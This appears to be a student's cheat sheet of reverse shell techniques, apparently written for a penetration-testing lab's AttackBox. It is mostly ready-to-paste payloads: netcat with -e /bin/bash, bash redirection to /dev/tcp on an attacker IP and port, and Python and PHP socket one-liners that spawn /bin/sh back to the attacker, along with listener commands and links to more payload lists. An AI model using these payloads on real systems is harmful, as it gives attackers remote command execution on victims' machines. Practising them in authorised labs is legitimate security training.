# Reverse Shell Techniques

A reverse shell is a technique used in penetration testing or hacking to gain remote access to a target machine. It involves establishing a connection from the target machine back to the attacker's machine, allowing the attacker to execute commands on the target system. Here are some commonly used reverse shell techniques:

## Use Reverse Shell Generator

- On your AttackBox, go to Firefox > Bookmarks > Revshell Generator (or http://localhost:7778/)
- Under IP & Port, add your attackbox IP and Port on which you want your vulnerable machine to connect.
- Under Reverse choose among wide variety of Reverse Shells provided. Common ones are: `nc mkfifo`, `Python #2`, `Python3 #2`, `Python3 shortest`.
- The attacker sets up a listener using `nc -lvp <attacker_port>` and waits for the target machine to connect back.
- Copy the reverse shell and paste it to the location where it gets executed by the vulnerable machine.

## Netcat Reverse Shell

- Netcat, or `nc`, is a versatile networking utility that can be used to establish a reverse shell connection.
- The attacker sets up a listener using `nc -lvp <attacker_port>` and waits for the target machine to connect back.
- Example: `nc -lvnp <port>` on the attacker's machine and `nc <attacker_ip> <attacker_port> -e /bin/bash` on the target machine.

Resource link: [Netcat Reverse Shell Cheat Sheet (highon.coffee)](https://highon.coffee/blog/reverse-shell-cheat-sheet/)

## Bash Reverse Shell

- Bash, the popular Unix shell, can be used to create a reverse shell connection.
- The attacker sets up a listener using `nc -lvp <attacker_port>` and waits for the target machine to connect back.
- Example 1: `bash -i >& /dev/tcp/<attacker_ip>/<attacker_port> 0>&1` on the target machine.
- Example 2 (Pentest Monkey Bash Reverse Shell): `bash -c 'bash -i >& /dev/tcp/<attacker_ip>/<attacker_port> 0>&1'` on the target machine.

Resource link: [Bash Reverse Shell Cheat Sheet (pentestmonkey.net)](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

## Python Reverse Shell

- Python scripting language can be used to create a reverse shell connection.
- The attacker sets up a listener using `nc -lvp <attacker_port>` and waits for the target machine to connect back.
- Example: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_ip>",<attacker_port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'` on the target machine. Change the values on `<attacker_ip>` and `<attacker_port>`

Resource link: [Python Reverse Shell Cheat Sheet (sushant747.gitbooks.io)](https://sushant747.gitbooks.io/total-oscp-guide/reverse-shell.html)

## PHP Reverse Shell

- PHP can be used to create a reverse shell connection.
- The attacker sets up a PHP script as the listener and waits for the target machine to connect back.
- Example (Pentest Monkey PHP Reverse Shell): `php -r '$sock=fsockopen("<attacker_ip>",<attacker_port>);exec("/bin/sh -i <&3 >&3 2>&3");'` on the target machine.

Resource link: [PHP Reverse Shell Cheat Sheet (pentestmonkey.net)](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
